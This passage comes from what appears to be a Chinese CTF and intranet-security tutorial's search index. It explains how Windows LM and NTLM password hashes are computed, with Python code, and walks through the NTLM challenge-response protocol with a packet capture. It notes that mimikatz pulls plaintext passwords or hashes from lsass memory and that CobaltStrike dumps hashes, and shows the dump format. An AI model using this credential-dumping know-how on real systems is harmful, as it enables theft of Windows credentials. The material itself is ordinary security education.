\u5f00\u59cb\uff0cWindows \u9ed8\u8ba4\u7981\u7528\u4e86 LM Hash)\u3002LM Hash\u660e\u6587\u5bc6\u7801\u88ab\u9650\u5b9a\u572814\u4f4d\u4ee5\u5185\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u8981\u505c\u6b62\u4f7f\u7528LM Hash\uff0c\u5c06\u7528\u6237\u7684\u5bc6\u7801\u8bbe\u7f6e\u4e3a14\u4f4d\u4ee5\u4e0a\u5373\u53ef\u3002</p> <p>\u5982\u679c LM Hash \u7684\u503c\u4e3a\uff1aaad3b435b51404eeaad3b435b51404ee\uff0c\u8bf4\u660e LMHash \u4e3a\u7a7a\u503c\u6216\u8005\u88ab\u7981\u7528\u4e86\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#_2","title":"\u52a0\u5bc6\u6d41\u7a0b","text":"<p>LM Hash \u7684\u52a0\u5bc6\u6d41\u7a0b\u5982\u4e0b\uff0c\u6211\u4eec\u4ee5\u53e3\u4ee4 P@ss1234 \u4e3a\u4f8b\u6f14\u793a\uff1a</p> <p>1\uff09\u5c06\u7528\u6237\u7684\u660e\u6587\u53e3\u4ee4\u8f6c\u6362\u4e3a\u5927\u5199,\u5e76\u8f6c\u6362\u4e3a 16 \u8fdb\u5236\u5b57\u7b26\u4e32\u3002</p> <p>P@ss1234 -&gt; \u5927\u5199 = P@SS1234 -&gt; \u8f6c\u4e3a\u5341\u516d\u8fdb\u5236 = 5040535331323334</p> <p>2\uff09\u5982\u679c\u8f6c\u6362\u540e\u7684 16 \u8fdb\u5236\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u4e0d\u8db3 14 \u5b57\u8282(\u957f\u5ea6 28)\uff0c\u7528 0 \u6765\u8865\u5168\u3002</p> <p>5040535331323334 -&gt; \u7528 0 \u8865\u5168\u4e3a 14 \u5b57\u8282(\u957f\u5ea6 28) = 5040535331323334000000000000</p> <p>3\uff09\u5c06 14 \u5b57\u8282\u5206\u4e3a\u4e24\u7ec4\uff0c\u6bcf\u7ec4 7 \u5b57\u8282\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6bcf\u7ec4\u4e8c\u8fdb\u5236\u6570\u636e\u957f\u5ea6\u4e3a56 \u6bd4\u7279\u4f4d\u3002\u5982\u56fe\u6240\u793a\u3002</p> <p></p> <p>4\uff09\u5c06\u6bcf\u7ec4\u4e8c\u8fdb\u5236\u6570\u636e\u63097\u6bd4\u7279\u4f4d\u4e3a\u4e00\u7ec4\uff0c\u5206\u4e3a8\u7ec4\uff0c\u6bcf\u7ec4\u672b\u5c3e\u52a00\uff0c\u518d\u8f6c\u6362\u621016 \u8fdb\u5236\uff0c\u8fd9\u6837\u6bcf\u7ec4\u4e5f\u5c31\u6210\u4e868\u5b57\u8282\u957f\u5ea6\u768416\u8fdb\u5236\u6570\u636e\u4e86\u3002\u5982\u56fe\u6240\u793a\u3002</p> <p></p> <p>5\uff09\u5c06\u4e0a\u9762\u751f\u6210\u7684\u4e24\u7ec416\u8fdb\u5236\u6570\u636e\uff0c\u5206\u522b\u4f5c\u4e3aDES\u52a0\u5bc6\u5bc6\u94a5\u5bf9\u5b57\u7b26\u4e32\u201cKGS!@#$%\u201d\u8fdb\u884c\u52a0\u5bc6\u3002\u7136\u540e\u5c06DES\u52a0\u5bc6\u540e\u7684\u4e24\u7ec4\u5bc6\u6587\u8fdb\u884c\u62fc\u63a5\uff0c\u5f97\u5230\u6700\u7ec8\u7684LMHASH\u503c\u3002\u5982\u56fe\u6240\u793a\u3002</p> <p>KGS!@#$%\u8f6c\u4e3a16\u8fdb\u5236\u4e3a\uff1a4B47532140232425</p> <p></p> <p></p> <p></p> <p>LM Hash \u52a0\u5bc6\u4ee3\u7801\u5b9e\u73b0\u5982\u4e0b(Python2)\uff1a</p> <pre><code># coding=utf-8\nimport base64\nimport binascii\nfrom pyDes import *\nimport hashlib,binascii\nimport md5\n\ndef DesEncrypt(str, Des_Key):\n    k = des(Des_Key, ECB, pad=None)\n    EncryptStr = k.encrypt(str)\n    return binascii.b2a_hex(EncryptStr)\n\n\ndef Zero_padding(str):\n    b = []\n    l = len(str)\n    num = 0\n    for n in range(l):\n        if (num &lt; 8) and n % 7 == 0:\n            b.append(str[n:n + 7] + '0')\n            num = num + 1\n    return ''.join(b)\n\nif __name__ == \"__main__\":\n\n    test_str = raw_input(\"please input a string: \")\n\n    # \u7528\u6237\u7684\u5bc6\u7801\u8f6c\u6362\u4e3a\u5927\u5199\n    test_str = test_str.upper()\n    print('\\033[91m'+\"\u8f6c\u6362\u4e3a\u5927\u5199:\"+'\\033[0m')\n    print(test_str)\n    #\u8f6c\u6362\u4e3a16\u8fdb\u5236\u5b57\u7b26\u4e32\n    test_str = test_str.encode('hex')\n    print('\\033[91m'+\"\u8f6c\u6362\u4e3a16\u8fdb\u5236\u5b57\u7b26\u4e32:\"+'\\033[0m')\n    print(test_str)\n    str_len = len(test_str)\n\n    # \u5bc6\u7801\u4e0d\u8db314\u5b57\u8282\u5c06\u4f1a\u75280\u6765\u8865\u5168\n    if str_len &lt; 28:\n        test_str = test_str.ljust(28, '0')\n        print('\\033[91m'+\"\u4e0d\u8db314\u5b57\u8282(\u957f\u5ea628)\uff0c\u75280\u6765\u8865\u5168:\"+'\\033[0m')\n        print(test_str)\n\n    # \u56fa\u5b9a\u957f\u5ea6\u7684\u5bc6\u7801\u88ab\u5206\u6210\u4e24\u4e2a7byte\u90e8\u5206\n    t_1 = test_str[0:len(test_str) / 2]\n    t_2 = test_str[len(test_str) / 2:]\n    print('\\033[91m'+\"\u5c0614\u5b57\u8282\u5206\u4e3a\u4e24\u7ec4\uff0c\u6bcf\u7ec47\u5b57\u8282\"+'\\033[0m')\n    print(t_1)\n    print(t_2)\n\n    # \u6bcf\u90e8\u5206\u8f6c\u6362\u6210\u6bd4\u7279\u6d41\uff0c\u5e76\u4e14\u957f\u5ea6\u4f4d56bit\uff0c\u957f\u5ea6\u4e0d\u8db3\u4f7f\u75280\u5728\u5de6\u8fb9\u8865\u9f50\u957f\u5ea6\n    t_1 = bin(int(t_1, 16)).lstrip('0b').rjust(56, '0')\n    t_2 = bin(int(t_2, 16)).lstrip('0b').rjust(56, '0')\n    print('\\033[91m'+\"\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6bcf\u7ec4\u4e8c\u8fdb\u5236\u6570\u636e\u957f\u5ea6\u4e3a56\u6bd4\u7279\u4f4d\"+'\\033[0m')\n    print(t_1)\n    print(t_2)\n\n    # \u518d\u52067bit\u4e3a\u4e00\u7ec4\u672b\u5c3e\u52a00\uff0c\u7ec4\u6210\u65b0\u7684\u7f16\u7801\n    t_1 = Zero_padding(t_1)\n    t_2 = Zero_padding(t_2)\n    print('\\033[91m'+\"\u5c06\u6bcf\u7ec4\u4e8c\u8fdb\u5236\u6570\u636e\u63097\u6bd4\u7279\u4f4d\u4e3a\u4e00\u7ec4\uff0c\u5206\u4e3a8\u7ec4\uff0c\u6bcf\u7ec4\u672b\u5c3e\u52a00\"+'\\033[0m')\n    print(t_1)\n    print(t_2)\n    # print t_1\n    t_1 = hex(int(t_1, 2))\n    t_2 = hex(int(t_2, 2))\n\n    t_1 = t_1[2:].rstrip('L')\n    t_2 = t_2[2:].rstrip('L')\n    print('\\033[91m'+\"\u4e24\u7ec4\u5206\u522b\u8f6c\u6362\u4e3a16\u8fdb\u5236\u5b57\u7b26\u4e32\"+'\\033[0m')\n    print(t_1)\n    print(t_2)\n\n    if '0' == t_2:\n        t_2 = \"0000000000000000\"\n    t_1 = binascii.a2b_hex(t_1)\n    t_2 = binascii.a2b_hex(t_2)\n\n    # \u4e0a\u6b65\u9aa4\u5f97\u5230\u76848byte\u4e8c\u7ec4\uff0c\u5206\u522b\u4f5c\u4e3aDES key\u4e3a\"KGS!@#$%\"\u8fdb\u884c\u52a0\u5bc6\u3002\n    LM_1 = DesEncrypt(\"KGS!@#$%\", t_1)\n    LM_2 = DesEncrypt(\"KGS!@#$%\", t_2)\n    print('\\033[91m'+\"\u4e0a\u6b65\u9aa4\u5f97\u5230\u76848byte\u4e8c\u7ec4\uff0c\u5206\u522b\u4f5c\u4e3aDES key\u4e3a\\\"KGS!@#$%\\\"\u8fdb\u884c\u52a0\u5bc6\"+'\\033[0m')\n    print(\"LM_1:\"+LM_1)\n    print(\"LM_1:\"+LM_2)\n\n    # \u5c06\u4e8c\u7ec4DES\u52a0\u5bc6\u540e\u7684\u7f16\u7801\u62fc\u63a5\uff0c\u5f97\u5230\u6700\u7ec8LM HASH\u503c\u3002\n    print('\\033[91m'+\"\u5c06\u4e8c\u7ec4DES\u52a0\u5bc6\u540e\u7684\u7f16\u7801\u62fc\u63a5\uff0c\u5f97\u5230\u6700\u7ec8LM HASH\u503c\"+'\\033[0m')\n    LM_Hash = LM_1 + LM_2\n    print (\"LM_Hash:\"+LM_Hash)\n</code></pre> <p>\u4ee3\u7801\u8fd0\u884c\u6548\u679c\u5982\u56fe\u6240\u793a\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#ntlm-hash","title":"NTLM Hash \u52a0\u5bc6\u7b97\u6cd5","text":"<p>\u4e3a\u4e86\u89e3\u51b3LM Hash\u52a0\u5bc6\u548c\u8eab\u4efd\u9a8c\u8bc1\u65b9\u6848\u4e2d\u56fa\u6709\u7684\u5b89\u5168\u5f31\u70b9\uff0c\u5fae\u8f6f\u4e8e 1993 \u5e74\u5728Windows NT 3.1 \u4e2d\u9996\u6b21\u5f15\u5165\u4e86 NTLM (New TechnologyLAN Manager ) Hash\u3002\u4e0b\u56fe 1-3 \u662f\u5404\u4e2a Windows \u7248\u672c\u5bf9 LM Hash \u548c NTLM Hash \u7684\u652f\u6301\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5fae\u8f6f\u4ece Windwos Vista \u548c Windows Server 2008 \u5f00\u59cb\uff0c\u9ed8\u8ba4\u7981\u7528\u4e86 LM Hash\uff0c\u53ea\u5b58\u50a8 NTLM Hash\uff0c\u800c LM Hash \u7684\u4f4d\u7f6e\u5219\u4e3a\u7a7a\uff1aaad3b435b51404eeaad3b435b51404ee</p> <p>\u4e0d\u540c Windows \u7cfb\u7edf\u7248\u672c\u5bf9 LM \u548c NTLM \u7684\u652f\u6301\u5982\u56fe 1-3 \u6240\u793a\u3002</p> <p></p> <p>NTLM Hash \u7b97\u6cd5\u662f\u5fae\u8f6f\u4e3a\u4e86\u5728\u63d0\u9ad8\u5b89\u5168\u6027\u7684\u540c\u65f6\u4fdd\u8bc1\u517c\u5bb9\u6027\u800c\u8bbe\u8ba1\u7684\u6563\u5217\u52a0\u5bc6\u7b97\u6cd5\u3002NTLM Hash \u662f\u57fa\u4e8e MD4 \u52a0\u5bc6\u7b97\u6cd5\u8fdb\u884c\u52a0\u5bc6\u7684\u3002</p> <p>\u4e0b\u9762\u6211\u4eec\u6765\u770b\u770b NTLM Hash \u7684\u52a0\u5bc6\u6d41\u7a0b\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#1ntlm-hash","title":"1.NTLM Hash \u52a0\u5bc6\u6d41\u7a0b","text":"<p>NTLM Hash \u7684\u52a0\u5bc6\u65b9\u7a0b\u5982\u4e0b\uff0c\u53ef\u4ee5\u770b\u5230 NTLM Hash \u662f\u7531\u660e\u6587\u5bc6\u7801\u7ecf\u8fc7\u4e09\u6b65\u52a0\u5bc6\u800c\u6210\uff1a</p> <p>NTLM Hash = md4(unicode(hex(password)))</p> <p>NTLM Hash \u7684\u52a0\u5bc6\u6d41\u7a0b\u5206\u4e3a\u4e09\u6b65\uff0c\u5177\u4f53\u5982\u4e0b\uff1a</p> <p>1\uff09\u5148\u5c06\u7528\u6237\u5bc6\u7801\u8f6c\u6362\u4e3a 16 \u8fdb\u5236\u683c\u5f0f\u3002 2\uff09\u518d\u5c06 16 \u8fdb\u5236\u683c\u5f0f\u7684\u5b57\u7b26\u4e32\u8fdb\u884c ASCII \u8f6c Unicode \u7f16\u7801\u3002 3\uff09\u6700\u540e\u5bf9 Unicode \u7f16\u7801\u7684 16 \u8fdb\u5236\u5b57\u7b26\u4e32\u8fdb\u884c\u6807\u51c6 MD4 \u5355\u5411\u54c8\u5e0c\u52a0\u5bc6\u3002</p> <p>\u5982\u4e0b\u53ef\u4ee5\u770b\u5230 P@ss1234 \u901a\u8fc7 NTLM Hash \u7684\u52a0\u5bc6\u6d41\u7a0b\u4e00\u6b65\u6b65\u52a0\u5bc6\u6210\u4e3a NTLM</p> <p>Hash\uff1a74520a4ec2626e3638066146a0d5ceae\u3002</p> <pre><code>P@ss1234 -&gt; \u8f6c\u4e3a\u5341\u516d\u8fdb\u5236 = 5040737331323334\n5040737331323334 -&gt; ASCII \u8f6c Unicode \u7f16\u7801 = 50004000730073003100320033003400\n50004000730073003100320033003400 -&gt; MD4 \u52a0\u5bc6 = 74520a4ec2626e3638066146a0d5ceae\n</code></pre> <p>NTLM Hash \u52a0\u5bc6\u4ee3\u7801\u5b9e\u73b0\u5982\u4e0b(Python3)\uff1a</p> <pre><code># coding=utf-8\nfrom Cryptodome.Hash import MD4\nimport binascii\nfrom cprint import cprint\n\n#\u8f6c\u4e3a16\u8fdb\u5236\u683c\u5f0f\ndef str_to_hex(string):\n  return ' '.join([hex(ord(t)).replace('0x', '') for t in string])\n\n#\u518d\u5c0616\u8fdb\u5236\u683c\u5f0f\u7684\u5b57\u7b26\u4e32\u8fdb\u884cASCII\u8f6cUnicode\u7f16\u7801\ndef hex_to_unicode(string):\n  return string.replace(\" \",\"00\")+\"00\"\n\n#\u6700\u540e\u5bf9Unicode\u7f16\u7801\u768416\u8fdb\u5236\u5b57\u7b26\u4e32\u8fdb\u884c\u6807\u51c6MD4\u5355\u5411\u54c8\u5e0c\u52a0\u5bc6\ndef unicode_to_md4(string):\n  m = MD4.new()\n  m.update(binascii.a2b_hex(string))\n  return m.hexdigest()\n\nif __name__ == \"__main__\":\n    string = input(\"please input a string: \")\n    HEX = str_to_hex(string)\n    cprint.err(\"HEX\u7f16\u7801:\")\n    print(HEX)\n    Unicode = hex_to_unicode(HEX)\n    cprint.err(\"ASCII\u8f6cUnicode\u7f16\u7801\")\n    print(Unicode)\n    NTLm_Hash = unicode_to_md4(Unicode)\n    cprint.err(\"\u5bf9Unicode\u7f16\u7801\u768416\u8fdb\u5236\u5b57\u7b26\u4e32\u8fdb\u884c\u6807\u51c6MD4\u5355\u5411\u54c8\u5e0c\u52a0\u5bc6\u5f97\u5230NTLM Hash\")\n    print(NTLm_Hash)\n</code></pre> <p>\u4ee3\u7801\u8fd0\u884c\u6548\u679c\u5982\u56fe</p> <p></p> <p>\u53c8\u6216\u8005\u76f4\u63a5\u4e00\u6761 python \u547d\u4ee4\u5373\u53ef\uff0c\u5982\u4e0b\u3002</p> <pre><code>python3 -c 'import hashlib,binascii; print(\"NTLM_Hash:\"+binascii.hexlify(hashlib.new(\"md4\", \"P@ss1234\".encode(\"utf-16le\")).digest()).decode(\"utf-8\"))'\n</code></pre> <p>\u76f4\u63a5\u4e00\u6761 Python \u547d\u4ee4\u8fdb\u884c NTLM Hash \u52a0\u5bc6\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#2windowsntlm-hash","title":"2.Windows\u7cfb\u7edf\u5b58\u50a8\u7684NTLM Hash","text":"<p>\u7528\u6237\u7684\u5bc6\u7801\u7ecf\u8fc7NTLM Hash\u52a0\u5bc6\u540e\u5b58\u50a8\u5728<code>%SystemRoot%\\system32\\config\\SAM</code>\u6587\u4ef6\u91cc\u9762</p> <p></p> <p>\u5f53\u7528\u6237\u8f93\u5165\u5bc6\u7801\u8fdb\u884c\u672c\u5730\u8ba4\u8bc1\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6240\u6709\u7684\u64cd\u4f5c\u90fd\u662f\u5728\u672c\u5730\u8fdb\u884c\u7684\u3002\u7cfb\u7edf\u5c06\u7528\u6237\u8f93\u5165\u7684\u5bc6\u7801\u8f6c\u6362\u6210NTLM Hash\uff0c\u7136\u540e\u4e0eSAM\u6587\u4ef6\u4e2d\u7684NTLM Hash\u8fdb\u884c\u6bd4\u8f83\uff0c\u76f8\u540c\u8bf4\u660e\u5bc6\u7801\u6b63\u786e\uff0c\u53cd\u4e4b\u9519\u8bef\u3002\u5f53\u7528\u6237\u6ce8\u9500\uff0c\u91cd\u542f\uff0c\u9501\u5c4f\u540e\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u8ba9<code>winlogon.exe</code>\u663e\u793a\u767b\u9646\u754c\u9762\uff0c\u4e5f\u5c31\u662f\u8f93\u5165\u6846\u3002\u5f53winlogon.exe\u63a5\u53d7\u8f93\u5165\u540e\uff0c\u5c06\u5bc6\u7801\u4ea4\u7ed9<code>lsass.exe</code>\u8fdb\u7a0b\u3002lsass.exe\u8fdb\u7a0b\u4e2d\u4f1a\u5b58\u4e00\u4efd\u660e\u6587\u5bc6\u7801\uff0c\u5c06\u660e\u6587\u5bc6\u7801\u52a0\u5bc6\u6210NTLM Hash\uff0c\u4e0eSAM\u6570\u636e\u5e93\u8fdb\u884c\u6bd4\u8f83\u8ba4\u8bc1\u3002\u6211\u4eec\u4f7f\u7528mimikatz\u5c31\u662f\u4ecelsass.exe\u8fdb\u7a0b\u4e2d\u6293\u53d6\u660e\u6587\u5bc6\u7801\u6216\u8005\u5bc6\u7801\u54c8\u5e0c\u3002\u4f7f\u7528mimikatz\u6293\u53d6lsass\u5185\u5b58\u4e2d\u7684\u51ed\u636e\u5982\u56fe\u3002</p> <p></p> <p>\u4f7f\u7528 MSF \u6216\u8005 CobaltStrike \u901a\u8fc7\u8f6c\u50a8\u54c8\u5e0c\u6293\u5230\u7684\u5bc6\u7801\u683c\u5f0f\u5982\u4e0b\uff0c\u7b2c\u4e00\u90e8\u5206\u662f\u7528\u6237\u540d\uff0c\u7b2c\u4e8c\u90e8\u5206\u662f\u7528\u6237\u7684 SID \u503c\uff0c\u7b2c\u4e09\u90e8\u5206\u662f LM Hash\uff0c\u7b2c\u56db\u90e8\u5206\u662f NTLMHash\uff0c\u5176\u4f59\u90e8\u5206\u4e3a\u7a7a\u3002</p> <pre><code>\u7528\u6237\u540d:\u7528\u6237 SID \u503c:LM Hash:NTLM Hash:::\n</code></pre> <p>\u4ece Windows Vista \u548c Windows Server 2008 \u5f00\u59cb\uff0c\u7531\u4e8e\u9ed8\u8ba4\u7981\u7528\u4e86 LM Hash\uff0c\u56e0\u6b64\u7b2c\u4e09\u90e8\u5206\u7684 LM Hash \u56fa\u5b9a\u4e3a\u7a7a\u503c\uff0c\u7b2c\u56db\u90e8\u5206\u7684 NTLM-Hash \u624d\u662f\u7528\u6237\u5bc6\u7801\u52a0\u5bc6\u540e\u7684\u51ed\u636e\u3002</p> <p>\u4f7f\u7528 CobaltStrike \u7684\u8f6c\u50a8\u54c8\u5e0c\u529f\u80fd\u8f6c\u50a8\u76ee\u6807\u673a\u5668\u5185\u5b58\u4e2d\u7684\u51ed\u636e\u5982\u56fe</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#ntlm_1","title":"NTLM \u534f\u8bae\u8ba4\u8bc1","text":"<p>NTLM \u8eab\u4efd\u8ba4\u8bc1\u534f\u8bae\u662f\u4e00\u79cd\u57fa\u4e8e Challenge/Response \u8d28\u8be2\u54cd\u5e94\u9a8c\u8bc1\u673a\u5236\uff0c\u7531\u4e09\u79cd\u7c7b\u578b\u6d88\u606f\u7ec4\u6210\uff1a</p> <ul> <li>type 1(\u534f\u5546\uff0cNegotiate)\uff1a\u53cc\u65b9\u786e\u5b9a\u4f20\u8f93\u534f\u8bae\u7684\u7248\u672c\u3001\u660e\u6587\u7528\u6237\u540d\u3002</li> <li>type 2(\u8d28\u8be2\uff0cChallenge)\uff1a\u751f\u6210Challenge</li> <li>type 3(\u8ba4\u8bc1\uff0cAuth)\uff1a\u53d1\u9001Response</li> </ul> <p>NTLM \u8eab\u4efd\u8ba4\u8bc1\u534f\u8bae\u6709 NTLM v1 \u548c NTLM v2 \u4e24\u4e2a\u7248\u672c\uff0c\u76ee\u524d\u4f7f\u7528\u6700\u591a\u7684\u662fNTLM v2 \u7248\u672c\u3002NTLM v1 \u4e0e NTLM v2 \u6700\u663e\u8457\u7684\u533a\u522b\u5c31\u662f Challenge \u8d28\u8be2\u503c\u4e0e\u52a0\u5bc6\u7b97\u6cd5\u4e0d\u540c\uff0c\u5171\u540c\u4e4b\u5904\u5c31\u662f\u90fd\u662f\u4f7f\u7528\u7684 NTLM Hash \u8fdb\u884c\u52a0\u5bc6\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#1-ntlm","title":"1.\u5de5\u4f5c\u7ec4\u73af\u5883\u4e0b\u7684 NTLM \u8ba4\u8bc1","text":"<p>\u5de5\u4f5c\u7ec4\u73af\u5883\u4e0b\u7684 NTLM \u8ba4\u8bc1\u6d41\u7a0b\u56fe\u5982\u56fe</p> <p></p> <p>\u5de5\u4f5c\u7ec4\u73af\u5883\u4e0b NTLM \u8ba4\u8bc1\u6d41\u7a0b\u53ef\u4ee5\u5206\u4e3a\u5982\u4e0b 4 \u6b65\u3002</p> <p>1.\u5f53\u5ba2\u6237\u7aef\u8981\u8bbf\u95ee\u670d\u52a1\u5668\u4e0a\u67d0\u4e2a\u53d7\u4fdd\u62a4\u7684\u670d\u52a1\u65f6\uff0c\u9700\u8981\u8f93\u5165\u670d\u52a1\u5668\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u8fdb\u884c\u9a8c\u8bc1\u3002\u6b64\u65f6\u5ba2\u6237\u7aef\u4f1a\u5728\u672c\u5730\u7f13\u5b58\u4e00\u4efd\u670d\u52a1\u5668\u5bc6\u7801\u7684NTLM hash\uff0c\u7136\u540e\u5411\u670d\u52a1\u5668\u53d1\u9001\u534f\u5546\u6d88\u606f\u3002</p> <p>2.\u670d\u52a1\u5668\u6536\u5230\u5ba2\u6237\u7aef\u7684\u534f\u5546\u4fe1\u606f\u540e\uff0c\u751f\u6210\u5e76\u56de\u590d\u8d28\u8be2\u6d88\u606f\u3002\u8be5\u6d88\u606f\u4e2d\u5305\u542b\u4e86\u4e00\u4e2a\u7531\u670d\u52a1\u7aef\u751f\u6210\u768416\u4f4d\u968f\u673a\u503cchallenge\uff0c\u670d\u52a1\u5668\u4e5f\u4f1a\u5728\u672c\u5730\u7f13\u5b58\u8be5\u503c\u3002</p> <p>3.\u5ba2\u6237\u7aef\u6536\u5230\u8d28\u8be2\u6d88\u606f\u540e\uff0c\u4f1a\u4f7f\u7528\u6b65\u9aa41\u4e2d\u7f13\u5b58\u7684\u670d\u52a1\u5668\u7684NTLM hash\u5bf9Challenge\u8fdb\u884c\u52a0\u5bc6\u751f\u6210Response\uff0c\u63a5\u7740\u518d\u751f\u6210<code>Net-NTLM hash=Challenge+Response+\u7528\u6237\u540d</code>\u7b49\uff0c\u518d\u5c06<code>Net-NTLM hash</code>\u5c01\u88c5\u5230\u8eab\u4efd\u9a8c\u8bc1\u6d88\u606f\u4e2d\u53d1\u5f80\u670d\u52a1\u5668\u3002</p> <p>4.\u670d\u52a1\u5668\u5728\u6536\u5230\u8eab\u4efd\u9a8c\u8bc1\u6d88\u606f\u540e\uff0c\u7528\u81ea\u5df1\u5bc6\u7801\u7684NTLM hash\u5bf9Challenge\u8fdb\u884c\u52a0\u5bc6\u751f\u6210Response2\uff0c\u5e76\u6bd4\u8f83Response2\u4e0eResponse\u662f\u5426\u4e00\u81f4\u3002\u5982\u679c\u4e00\u81f4\uff0c\u5c31\u8bc1\u660e\u5ba2\u6237\u7aef\u638c\u63e1\u4e86\u670d\u52a1\u5668\u7684\u5bc6\u7801\uff0c\u8ba4\u8bc1\u6210\u529f\uff0c\u5426\u5219\u8ba4\u8bc1\u5931\u8d25\u3002</p> <p>\u7531\u4e8e NTLM \u53ea\u662f\u5e95\u5c42\u7684\u8ba4\u8bc1\u534f\u8bae\uff0c\u5176\u5fc5\u987b\u9576\u5d4c\u5728\u4e0a\u5c42\u5e94\u7528\u534f\u8bae\u91cc\u9762\uff0c\u6d88\u606f\u7684\u4f20\u8f93\u4f9d\u8d56\u4e8e\u4f7f\u7528 NTLM \u7684\u4e0a\u5c42\u534f\u8bae\uff0c\u6bd4\u5982 SMB\u3001HTTP \u7b49\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#ntlm_2","title":"\u5de5\u4f5c\u7ec4\u73af\u5883\u4e0b\u7684 NTLM \u6293\u5305\u5206\u6790","text":"<p>\u5b9e\u9a8c\u73af\u5883\u5de5\u4f5c\u7ec4</p> <ul> <li>\u4e3b\u673aA\uff1a192.168.125.129</li> <li>\u4e3b\u673aB\uff1a192.168.125.130</li> </ul> <p>\u4e3b\u673aA\u8bbf\u95ee\u4e3b\u673aB\u7684\u5171\u4eab\u5e76\u6210\u529f\u8ba4\u8bc1\u65f6</p> <pre><code> net use \\\\192.168.125.130\\c$ win7.com /user:administrator\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u6574\u4e2a\u8fc7\u7a0b\u5206\u4e3a4\u6b65</p> <ul> <li>Session Setup Request, NTLMSSP_NEGOTIATE \u534f\u5546</li> <li>Session Setup Response, Error: STATUS_MORE_PROCESSING_REQUIRED, NTLMSSP_CHALLENGE \u8fd4\u56dechallenge</li> <li>Session Setup Request, NTLMSSP_AUTH, User: \\administrator \u63d0\u4ea4ntlm hash</li> <li>Session Setup Response \u8fd4\u56de\u8ba4\u8bc1\u6210\u529f</li> </ul> <p></p> <p>\u5f53\u8ba4\u8bc1\u5931\u8d25\u65f6\uff0c\u6574\u4e2a\u8ba4\u8bc1\u8fc7\u7a0b\u4e5f\u662f4\u6b65\uff0c\u524d\u4e09\u6b65\u548c\u8ba4\u8bc1\u6210\u529f\u7684\u8fc7\u7a0b\u4e00\u81f4\uff0c\u53ea\u6709\u6700\u540e\u4e00\u6b65\u4e0d\u4e00\u81f4</p> <ul> <li>Session Setup Request, NTLMSSP_NEGOTIATE \u534f\u5546</li> <li>Session Setup Response, Error: STATUS_MORE_PROCESSING_REQUIRED, NTLMSSP_CHALLENGE \u8fd4\u56dechallenge</li> <li>Session Setup Request, NTLMSSP_AUTH, User: \\administrator \u63d0\u4ea4ntlm hash</li> <li>Session Setup Response, Error: STATUS_LOGIN_FAILURE \u8fd4\u56de\u8ba4\u8bc1\u5931\u8d25</li> </ul> <p></p> <p>\u5728\u8ba4\u8bc1\u7684\u6574\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u8fc7\u8ba4\u8bc1\u6210\u529f\u8fd8\u662f\u5931\u8d25\uff0c\u90fd\u4f1a\u8fd4\u56dechallenge\uff0c\u524d\u9762\u7684\u8ba4\u8bc1\u539f\u7406\u5df2\u7ecf\u8bb2\u8fc7\u3002\u90a3\u8fd4\u56de\u7684challenge\u5728\u54ea\u91cc\u4e86\uff1f</p> <p></p> <p>\u5982\u4e0b\uff0cNTLM Server Challenge: 745d99992196a1b2\uff0c\u8fd9\u4e2a16\u4f4d\u957f\u7684\u5b57\u7b26\u4e32\u5c31\u662fchallenge</p> <p></p> <p>\u6211\u4eec\u6253\u5f00\u6bcf\u4e2a\u8ba4\u8bc1\u5305\u53d1\u73b0\uff0cNTLM \u8ba4\u8bc1\u7684\u6570\u636e\u5305\u90fd\u662f\u653e\u5728 GSS-API \u91cc\u9762\u7684.</p> <p>GSS-API(Generic Security Service Application Program Interface\uff0c\u901a\u7528\u5b89\u5168\u670d\u52a1\u5e94\u7528\u7a0b\u5e8f\u63a5\u53e3)\uff0c\u662f\u4e00\u79cd\u7edf\u4e00\u7684\u6a21\u5f0f\uff0c\u4e3a\u4f7f\u7528\u8005\u63d0\u4f9b\u4e0e\u673a\u5236\u65e0\u5173\uff0c\u5e73\u53f0\u65e0\u5173\uff0c\u7a0b\u5e8f\u8bed\u8a00\u73af\u5883\u65e0\u5173\uff0c\u5e76\u4e14\u53ef\u79fb\u690d\u7684\u5b89\u5168\u670d\u52a1\u3002\u7a0b\u5e8f\u5458\u5728\u7f16\u5199\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u53ef\u4ee5\u5e94\u7528\u901a\u7528\u7684\u5b89\u5168\u673a\u5236\uff0c\u56e0\u6b64\u5f00\u53d1\u8005\u4e0d\u5fc5\u9488\u5bf9\u4efb\u4f55\u7279\u5b9a\u7684\u5e73\u53f0\u3001\u5b89\u5168\u673a\u5236\u3001\u4fdd\u62a4\u7c7b\u578b\u6216\u4f20\u8f93\u534f\u8bae\u6765\u5b9a\u5236\u5b89\u5168\u5b9e\u73b0\u3002SSPI \u662f GSS-API \u7684\u4e00\u4e2a\u4e13\u6709\u53d8\u4f53\uff0c\u8fdb\u884c\u4e86\u6269\u5c55\u5e76\u5177\u6709\u8bb8\u591a\u7279\u5b9a\u4e8e Windows \u7684\u6570\u636e\u7c7b\u578b\u3002SSPI \u751f\u6210\u548c\u63a5\u53d7\u7684\u4ee4\u724c\u5927\u591a\u4e0e GSS-API \u517c\u5bb9\u3002\u800c\u8fd9\u91cc NTLM SSP \u5b9e\u73b0\u4e86 SSPI\uff0c\u56e0\u6b64\u4e5f\u76f8\u5f53\u4e8e\u5b9e\u73b0\u4e86 GSS-API\u3002\u5e76\u4e14\u6ce8\u518c\u4e3aSSP \u7684\u4e00\u4e2a\u597d\u5904\u5c31\u662f\uff0cSSP 